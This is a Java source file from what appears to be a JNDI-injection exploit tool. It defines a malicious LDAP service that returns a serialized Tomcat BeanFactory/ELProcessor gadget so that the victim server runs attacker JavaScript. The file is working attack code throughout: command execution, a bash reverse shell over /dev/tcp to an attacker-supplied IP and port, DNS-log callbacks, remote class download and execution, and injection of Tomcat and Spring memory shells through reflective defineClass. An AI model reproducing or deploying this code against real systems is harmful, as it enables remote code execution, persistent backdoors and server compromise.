package net.roboterh.injector.gadgets;

import cn.hutool.http.HttpUtil;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import javassist.ClassPool;
import javassist.CtClass;
import net.roboterh.injector.enums.PayloadEnum;
import net.roboterh.injector.servers.HTTPServer;
import net.roboterh.injector.templates.*;
import net.roboterh.injector.utils.GadgetUtils;
import net.roboterh.injector.utils.PayloadUtils;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.io.InputStream;
import java.util.Arrays;


/*
    Tomcat EL Way:
    Requirement:
        Tomcat 8+(catalina and el-api) or springboot1.2.x+ in classpath
    Explanation:
        1. set javaSerializedData to Serialized ResourceRef-object
        2. call NamingManger#getObjectInstance when ldap-client calls lookup
        3. call getObjectFactoryFromReference in function getObjectInstance to get the factory from Ref
        4. call org.apache.naming.factory.BeanFactory#getObjectInstance
        5. call setter method
 */
public class TomcatEL implements LDAPService {
    private static final Logger logger = LogManager.getLogger(TomcatEL.class);

    private PayloadEnum payload;
    private String[] params;
    private String replacement;
    private String payloadTemplate = "{" +
            "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
            ".newInstance().getEngineByName(\"JavaScript\")" +
            ".eval(\"{replacement}\")" +
            "}";

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String baseDN) {
        argsHandler(baseDN);

        generateHandler();

        try {
            logger.info(String.format("Send LDAP result for %s using TomcatEL Way ...", baseDN));

            String finalPayload = payloadTemplate.replace("{replacement}", replacement);
            // create ResourceRef
            ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "",
                    true, "org.apache.naming.factory.BeanFactory", null);
            ref.add(new StringRefAddr("forceString", "x=eval"));
            ref.add(new StringRefAddr("x", finalPayload));

            Entry entry = new Entry(baseDN);
            entry.addAttribute("javaClassName", "java.lang.Class");
            entry.addAttribute("javaSerializedData", GadgetUtils.serialize(ref));
            result.sendSearchEntry(entry);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        } catch (Exception e) {
            logger.info(e.getMessage());
        }
    }

    @Override
    public void argsHandler(String baseDN) {
        int firstIndex = baseDN.indexOf("/");
        int secondIndex = baseDN.indexOf("/", firstIndex + 1);

        // obtain the value of Payload
        if (secondIndex != -1) {
            payload = PayloadEnum.valueOf(baseDN.substring(firstIndex + 1, secondIndex));
        } else {
            // only one '/'
            payload = PayloadEnum.valueOf(baseDN.substring(firstIndex + 1));
        }

        // add params
        switch (payload.name()) {
            case "JavaFile":
            case "DnsLog":
            case "File":
                String link = baseDN.substring(baseDN.lastIndexOf("/") + 1);
                params = new String[]{link};
                break;
            case "Command":
                String cmd = PayloadUtils.getCmdFromBase(baseDN);
                params = new String[]{cmd};
                break;
            case "ReverseShell":
                params = PayloadUtils.getIpAndPortFromBase(baseDN);
                break;
        }
        logger.info(String.format("Received Payload is %s, params are %s", payload, Arrays.toString(params)));
    }

    @Override
    public void generateHandler() {
        try {
            TomcatELTemplate tomcatELTemplate = new TomcatELTemplate();
            switch (payload.name()) {
                case "DnsLog":
                    replacement = tomcatELTemplate.getDnsRequestCode(params[0]);
                    break;
                case "Command":
                    replacement = tomcatELTemplate.getExecCode(params[0]);
                    break;
                case "ReverseShell":
                    replacement = tomcatELTemplate.getReverseShellCode(params[0], params[1]);
                    break;
                case "File":
                    replacement = HttpUtil.get(HTTPServer.codeBase + params[0]);
                    break;
                case "TomcatEcho":
                    replacement = tomcatELTemplate.getMemoryShell(TomcatEcho.class);
                    break;
                case "TomcatExecutor":
                    replacement = tomcatELTemplate.getMemoryShell(TomcatExecutor.class);
                    break;
                case "TomcatFilter":
                    replacement = tomcatELTemplate.getMemoryShell(TomcatFilter.class);
                    break;
                case "TomcatListener":
                    replacement = tomcatELTemplate.getMemoryShell(TomcatListener.class);
                    break;
                case "TomcatServlet":
                    replacement = tomcatELTemplate.getMemoryShell(TomcatServlet.class);
                    break;
                case "TomcatUpgrade":
                    replacement = tomcatELTemplate.getMemoryShell(TomcatUpgrade.class);
                    break;
                case "TomcatValve":
                    replacement = tomcatELTemplate.getMemoryShell(TomcatValve.class);
                    break;
                case "TomcatWebsocket":
                    replacement = tomcatELTemplate.getMemoryShell(TomcatWebsocket.class);
                    break;
                case "SpringController":
                    replacement = tomcatELTemplate.getMemoryShell(SpringController.class);
                    break;
                case "SpringEcho":
                    replacement = tomcatELTemplate.getMemoryShell(SpringEcho.class);
                    break;
                case "SpringInterceptor":
                    replacement = tomcatELTemplate.getMemoryShell(SpringInterceptor.class);
                    break;
                case "JavaFile":
                    InputStream inputStream = HttpUtil.createGet(HTTPServer.codeBase + params[0]).execute().bodyStream();
                    ClassPool pool = ClassPool.getDefault();
                    CtClass ctClass = pool.makeClass(inputStream);
                    replacement = tomcatELTemplate.getRemoteMemoryShell(PayloadUtils.base64Encode(ctClass.toBytecode()), ctClass.getName());
                    break;
            }
        } catch (Exception e) {
            logger.info(e.getMessage());
        }
    }

    /**
     * Script Template
     */
    private class TomcatELTemplate {
        public String getExecCode(String cmd) {
            // determine os using separator `/`
            String code = "var strs=new Array(3);\n" +
                    "        if(java.io.File.separator.equals('/')){\n" +
                    "            strs[0]='/bin/bash';\n" +
                    "            strs[1]='-c';\n" +
                    "            strs[2]='" + cmd + "';\n" +
                    "        }else{\n" +
                    "            strs[0]='cmd';\n" +
                    "            strs[1]='/C';\n" +
                    "            strs[2]='" + cmd + "';\n" +
                    "        }\n" +
                    "        java.lang.Runtime.getRuntime().exec(strs);";

            return code;
        }

        public String getDnsRequestCode(String dnslog){
            String code = "var str;\n" +
                    "            if(java.io.File.separator.equals('/')){\n" +
                    "                str = 'ping -c 1 " + dnslog + "';\n" +
                    "            }else{\n" +
                    "                str = 'nslookup " + dnslog + "';\n" +
                    "            }\n" +
                    "\n" +
                    "            java.lang.Runtime.getRuntime().exec(str);";

            return code;
        }

        public String getReverseShellCode(String ip, String port){
            int pt = Integer.parseInt(port);
            String code = "if(java.io.File.separator.equals('/')){\n" +
                    "                var cmds = new Array('/bin/bash', '-c', '/bin/bash -i >& /dev/tcp/" + ip + "/" + pt + "');\n" +
                    "                java.lang.Runtime.getRuntime().exec(cmds);\n" +
                    "            }";

            return code;
        }

        public String getRemoteMemoryShell(String classCode, String ClassName) {
            String code = "var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('" + classCode + "');\n" +
                    "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                    "try{\n" +
//                    "   var clazz = classLoader.loadClass('" + clazz.getName() + "');\n" +
//                    "   clazz.newInstance();\n" +
//                      "   Class<?> aClass1 = Class.forName(\"" + clazz.getName() + "\");\n" +
                    "   classLoader.loadClass('" + ClassName + "').newInstance();\n" +
                    "}catch(err){\n" +
                    "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                    "   method.setAccessible(true);\n" +
                    "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                    "   clazz.newInstance();\n" +
                    "};";

            return code;
        }

        // inject using classLoader
        public String getMemoryShell(Class clazz, String... args) {
            String classCode = null;
            try{
//                获取base64后的类
                classCode = PayloadUtils.getClassCode(clazz);

            }catch(Exception e){
                e.printStackTrace();
            }

            String code = "var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('" + classCode + "');\n" +
                    "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                    "try{\n" +
//                    "   var clazz = classLoader.loadClass('" + clazz.getName() + "');\n" +
//                    "   clazz.newInstance();\n" +
//                      "   Class<?> aClass1 = Class.forName(\"" + clazz.getName() + "\");\n" +
                    "   classLoader.loadClass('" + clazz.getName() + "').newInstance();\n" +
                    "}catch(err){\n" +
                    "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                    "   method.setAccessible(true);\n" +
                    "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                    "   clazz.newInstance();\n" +
                    "};";

            return code;
        }
    }
}
